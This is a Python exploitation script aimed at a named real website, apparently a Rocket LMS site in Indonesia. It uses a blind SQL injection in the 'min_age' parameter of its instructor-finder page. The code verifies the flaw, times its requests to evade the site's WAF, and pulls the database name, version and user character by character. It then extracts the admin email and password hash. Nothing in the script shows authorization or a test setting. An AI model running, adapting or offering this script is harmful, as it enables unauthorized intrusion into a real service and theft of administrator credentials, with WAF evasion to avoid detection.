"""
WEB.KELASDATA.CO.ID - SQL INJECTION EXPLOITATION
=================================================

Target: web.kelasdata.co.id (Rocket LMS Indonesia)

From previous report:
- TRUE (1 AND 1=1): 124,008 bytes
- FALSE (1 AND 1=2): 66,680 bytes
- Difference: ~57KB
- Protected by OpenResty WAF

Strategy:
1. Verify SQLi still works
2. Use stealth timing to avoid WAF ban
3. Extract database info via binary search
4. Extract admin credentials
"""

import requests
import time
import sys

BASE_URL = "https://web.kelasdata.co.id"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Referer": f"{BASE_URL}/",
}

session = requests.Session()
session.headers.update(HEADERS)
session.timeout = 30

def stealth_delay():
    """Random delay to avoid WAF detection"""
    time.sleep(1.5)

def verify_sqli():
    """Verify SQLi vulnerability"""
    print("\n" + "="*60)
    print("    STEP 1: VERIFY SQLi ON WEB.KELASDATA.CO.ID")
    print("="*60)
    
    url = f"{BASE_URL}/instructor-finder"
    
    try:
        # Baseline
        print("[*] Testing baseline...")
        r_base = session.get(url, params={"min_age": "1"})
        base_len = len(r_base.text)
        print(f"    Baseline: {base_len} bytes, Status: {r_base.status_code}")
        
        stealth_delay()
        
        # TRUE condition
        print("[*] Testing TRUE condition...")
        r_true = session.get(url, params={"min_age": "1 AND 1=1"})
        true_len = len(r_true.text)
        print(f"    TRUE (1 AND 1=1): {true_len} bytes, Status: {r_true.status_code}")
        
        stealth_delay()
        
        # FALSE condition
        print("[*] Testing FALSE condition...")
        r_false = session.get(url, params={"min_age": "1 AND 1=2"})
        false_len = len(r_false.text)
        print(f"    FALSE (1 AND 1=2): {false_len} bytes, Status: {r_false.status_code}")
        
        diff = true_len - false_len
        print(f"\n[*] Difference: {diff} bytes")
        
        if diff > 10000:
            print(f"[!!!] SQLi CONFIRMED! Large difference detected.")
            return true_len, false_len, True
        elif diff > 1000:
            print(f"[+] Possible SQLi, moderate difference")
            return true_len, false_len, True
        else:
            print(f"[-] No significant SQLi difference")
            return true_len, false_len, False
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return None, None, False

def binary_search_char(position, query, true_threshold, false_threshold):
    """Extract single character via binary search"""
    url = f"{BASE_URL}/instructor-finder"
    low, high = 32, 126
    avg_threshold = (true_threshold + false_threshold) // 2
    
    while low <= high:
        mid = (low + high) // 2
        
        payload = f"1 AND ASCII(SUBSTR(({query}),{position},1))>{mid}"
        
        try:
            r = session.get(url, params={"min_age": payload})
            response_len = len(r.text)
            
            if response_len > avg_threshold:
                # TRUE - char is greater than mid
                low = mid + 1
            else:
                # FALSE
                high = mid - 1
                
        except Exception as e:
            print(f"\n    Error: {e}")
            return None
        
        time.sleep(0.8)  # Stealth timing for OpenResty WAF
    
    return chr(low) if 32 <= low <= 126 else None

def extract_string(query, true_threshold, false_threshold, max_len=50, desc="Data"):
    """Extract string via SQLi"""
    result = ""
    
    print(f"\n[*] Extracting: {desc}")
    
    for position in range(1, max_len + 1):
        char = binary_search_char(position, query, true_threshold, false_threshold)
        
        if char is None or char in [' ', '\x00', chr(32)]:
            # Check if we got something
            if len(result) > 0:
                break
            continue
            
        result += char
        print(f"\r    {desc}: {result}", end="", flush=True)
    
    print()
    return result

def extract_database_info(true_len, false_len):
    """Extract database information"""
    print("\n" + "="*60)
    print("    STEP 2: EXTRACT DATABASE INFO")
    print("="*60)
    
    # Database name
    db_name = extract_string("SELECT database()", true_len, false_len, 30, "Database")
    
    stealth_delay()
    
    # Database version
    db_version = extract_string("SELECT version()", true_len, false_len, 20, "Version")
    
    stealth_delay()
    
    # Current user
    db_user = extract_string("SELECT user()", true_len, false_len, 30, "DB User")
    
    return db_name, db_version, db_user

def extract_admin_credentials(true_len, false_len):
    """Extract admin credentials"""
    print("\n" + "="*60)
    print("    STEP 3: EXTRACT ADMIN CREDENTIALS")
    print("="*60)
    
    # Admin email (ID=1)
    admin_email = extract_string(
        "SELECT email FROM users WHERE id=1",
        true_len, false_len, 50, "Admin Email"
    )
    
    stealth_delay()
    
    # Admin password hash (first 40 chars)
    admin_hash = extract_string(
        "SELECT password FROM users WHERE id=1",
        true_len, false_len, 60, "Password Hash"
    )
    
    return admin_email, admin_hash

def extract_table_count(true_len, false_len):
    """Count tables in database"""
    print("\n" + "="*60)
    print("    STEP 4: COUNT TABLES")
    print("="*60)
    
    url = f"{BASE_URL}/instructor-finder"
    avg_threshold = (true_len + false_len) // 2
    
    for count in range(1, 100):
        payload = f"1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())={count}"
        
        try:
            r = session.get(url, params={"min_age": payload})
            
            if len(r.text) > avg_threshold:
                print(f"[+] Total tables in database: {count}")
                return count
                
        except:
            pass
        
        time.sleep(0.5)
    
    return None

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       WEB.KELASDATA.CO.ID - SQL INJECTION EXPLOITATION       ║
║       Target: Rocket LMS Indonesia                           ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Step 1: Verify SQLi
    true_len, false_len, is_vuln = verify_sqli()
    
    if not is_vuln:
        print("\n[-] SQLi not confirmed or blocked. Exiting.")
        sys.exit(1)
    
    # Step 2: Extract database info
    db_name, db_version, db_user = extract_database_info(true_len, false_len)
    
    # Step 3: Extract admin credentials
    admin_email, admin_hash = extract_admin_credentials(true_len, false_len)
    
    # Summary
    print("\n" + "="*60)
    print("    EXPLOITATION SUMMARY")
    print("="*60)
    print(f"""
    [+] Target: {BASE_URL}
    [+] Database: {db_name}
    [+] Version: {db_version}
    [+] DB User: {db_user}
    [+] Admin Email: {admin_email}
    [+] Admin Hash: {admin_hash[:40] if admin_hash else 'N/A'}...
    """)

if __name__ == "__main__":
    main()
